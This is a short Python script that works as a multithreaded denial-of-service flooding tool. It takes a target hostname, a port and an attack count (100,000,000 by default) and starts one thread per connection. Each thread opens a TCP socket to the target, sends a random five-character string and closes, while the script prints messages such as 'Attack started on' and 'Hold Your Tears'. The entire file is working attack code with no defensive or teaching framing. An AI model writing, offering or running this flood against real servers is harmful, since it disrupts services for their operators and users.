# -*- coding: utf-8 -*-

import random
import socket
import string
import sys
import threading
import time

host = ''
ip = ''

port = 0
num_requests = 0

try:
    port = int(sys.argv[2])
except Exception:
    port = 80

try:
    num_requests = int(sys.argv[3])
except Exception:
    num_requests = 100000000

lenght = len(sys.argv)
if lenght <= 1 or lenght >= 5:
    print('ERROR\n Usage: ' + sys.argv[0] + ' \
          < HOSTNAME > < PORT > < NUMBER_OF_ATTACKS >')
    sys.exit(1)
try:
    host = str(sys.argv[1])
    # host = str(sys.argv[1]).replace('https://', '').\
    #     replace('http://', '').replace('www.', '')
    # ip = socket.gethostbyname(host)
    print(host, ip)
except socket.gaierror:
    print('ERROR\n Make sure you entered a correct website')
    sys.exit(2)

thread_num = 0
thread_num_mutex = threading.Lock()


def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print('\n ' + time.ctime().split(' ')
          [3] + ' ' + '[' + str(thread_num) + '] #-#-# Hold Your Tears #-#-#')
    thread_num_mutex.release()


def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = ''.join(random.sample(msg, 5))

    print('DATA', data)
    return data


def attack():
    print_status()
    url_path = generate_url_path()

    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        address_port = (host, port)
        dos.connect(address_port)
        dos.send(str.encode(url_path))

    except socket.error as e:
        print('\n [ No connection, server may be down ]: ' + str(e))

    dos.shutdown(socket.SHUT_RDWR)
    dos.close()


print('[#] Attack started on ' + host + '|| Port: ' +
      str(port) + ' || # Requests: ' + str(num_requests))

all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()
